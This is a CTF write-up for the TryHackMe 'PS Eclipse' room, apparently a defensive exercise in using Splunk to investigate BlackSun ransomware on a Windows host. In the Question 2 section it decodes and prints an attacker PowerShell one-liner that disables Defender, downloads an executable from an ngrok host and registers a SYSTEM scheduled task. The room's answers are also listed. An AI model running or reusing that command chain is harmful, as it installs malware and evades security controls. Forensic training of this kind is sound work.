# PS Eclipse

## Introduction

Welcome to my another writeup! In this TryHackMe [PS Eclipse](https://tryhackme.com/room/posheclipse) room, you'll learn: Digital forensics via Splunk and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

> Use Splunk to investigate the ransomware activity.

> Difficulty: Medium

Scenario: You are a SOC Analyst for an MSSP (Managed Security Service Provider) company called **TryNotHackMe**.

A customer sent an email asking for an analyst to investigate the events that occurred on Keegan's machine on **Monday, May 16th, 2022**. The client noted that **the machine** is operational, but some files have a weird file extension. The client is worried that there was a ransomware attempt on Keegan's device.

Your manager has tasked you to check the events in Splunk to determine what occurred in Keegan's device.

Happy Hunting!

## Task 1 - Ransomware or not

### Question 1 - A suspicious binary was downloaded to the endpoint. What was the name of the binary?

When we reach to the Splunk home page, we can use **`Search & Reporting`** to investigate the incident:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221104073248.png)

**Now, we can use `*` (wildcard) to search every single event logs, and set the timeline to `All time`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221104073543.png)

Let's search for a binary!

**Query:**
```
*.exe | dedup Image | table Image
```

In this query, we want to find something that is an exe executable, then find all the unique results and only show the `Image` table. 

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221104074649.png)

**Hmm... The `OUTSTANDING_GUTTER.exe` looks sussy, as it's in the `Temp` directory.**

- **Answer: `OUTSTANDING_GUTTER.exe`**

### Question 2 - What is the address the binary was downloaded from? Add http:// to your answer & defang the URL.

Next, we can try to search HTTP requests and responses:

**Query:**
```
tag=web
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221104080736.png)

Nothing...

Maybe the adversary is using **PowerShell** to transfer the suspicious binary?

**Query:**
```
powershell.exe | dedup CommandLine |  table CommandLine
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221104080858.png)

That big blob of base64 encoded string looks very sus! **Let's click on that result!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221104081013.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221104081305.png)

**We can decode that via `base64 -d`:**
```b
┌──(root🌸siunam)-[~/ctf/thm/ctf/PS-Eclipse]
└─# echo "UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwBlAHQAIABoAHQAdABwADoALwAvADgAOAA2AGUALQAxADgAMQAtADIAMQA1AC0AMgAxADQALQAzADIALgBuAGcAcgBvAGsALgBpAG8ALwBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlADsAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIAIAAvAFQAUgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABDAE8AVQBUAFMAVABBAE4ARABJAE4ARwBfAEcAVQBUAFQARQBSAC4AZQB4AGUAIgAgAC8AUwBDACAATwBOAEUAVgBFAE4AVAAgAC8ARQBDACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAALwBNAE8AIAAqAFsAUwB5AHMAdABlAG0ALwBFAHYAZQBuAHQASQBEAD0ANwA3ADcAXQAgAC8AUgBVACAAIgBTAFkAUwBUAEUATQAiACAALwBmADsAUwBDAEgAVABBAFMASwBTACAALwBSAHUAbgAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIA" | base64 -d
Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"
```

Found it!

- **Answer: `http://886e-181-215-214-32.ngrok.io`**

### Question 3 - What Windows executable was used to download the suspicious binary? Enter full path.

**It's using PowerShell to download the binary. You can copy it in `Image` table in the query result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221104081728.png)

- **Answer: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`**

### Question 4 - What command was executed to configure the suspicious binary to run with elevated privileges?

**In the question 2 `powershell.exe` query, we can also see a `schtasks.exe` command:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221104083705.png)

**Again, we can view this event in `View events`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221104083716.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221104083806.png)

In here, we can see that **it's running as SYSTEM user, and setting a persistence mechanism for the `OUTSTANDING_GUTTER.exe` binary!**

- **Answer: `"C:\\Windows\\system32\\schtasks.exe\" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\\Windows\\Temp\\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f"`**

### Question 5 - What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? (Format: User + ; + CommandLine)

Armed with above information, we know that:

**It's running as SYSTEM user, aka `NT Authority\SYSTEM`.**

- **Answer: `NT Authority\SYSTEM;"C:\\Windows\\system32\\schtasks.exe" /Run /TN "OUTSTANDING_GUTTER.exe"`**

### Question 6 - The suspicious binary connected to a remote server. What address did it connect to? Add http:// to your answer & defang the URL.

**Now, we can try to find a DNS query:**
```
OUTSTANDING_GUTTER.exe | dedup QueryName | table QueryName
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221107030601.png)

Found it!

- **Answer: `hxxp[://]9030-181-215-214-32[.]ngrok[.]io`**

### Question 7 - A PowerShell script was downloaded to the same location as the suspicious binary. What was the name of the file?

**In here, we can just query all `.ps1`(PowerShell script file):**
```
*.ps1
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221107030658.png)

- **Answer: `script.ps1`**

### Question 8 - The malicious script was flagged as malicious. What do you think was the actual name of the malicious script?

**Since we found the malicious script, we can use it's hash, and search it in [VirusTotal](https://www.virustotal.com/gui/home/search):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221107030953.png)

**Sha256: `E5429F2E44990B3D4E249C566FBF19741E671C0E40B809F87248D9EC9114BEF9`**

**Search it in VirusTotal:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221107031018.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221107031039.png)

- **Answer: `BlackSun.ps1`**

### Question 9 - A ransomware note was saved to disk, which can serve as an IOC. What is the full path to which the ransom note was saved?

**Again, we can just search any `.txt` file:**
```
*.txt
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221107031316.png)

- Answer: `C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt`

### Question 10 - The script saved an image file to disk to replace the user's desktop wallpaper, which can also serve as an IOC. What is the full path of the image?

**Since this malicious script is BlackSun, we can search `BlackSun` in the query:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/PS-Eclipse/images/Pasted%20image%2020221107031437.png)

Found it!

- Answer: `C:\Users\Public\Pictures\blacksun.jpg`

# Conclusion

What we've learned:

1. Digital Forensics via Splunk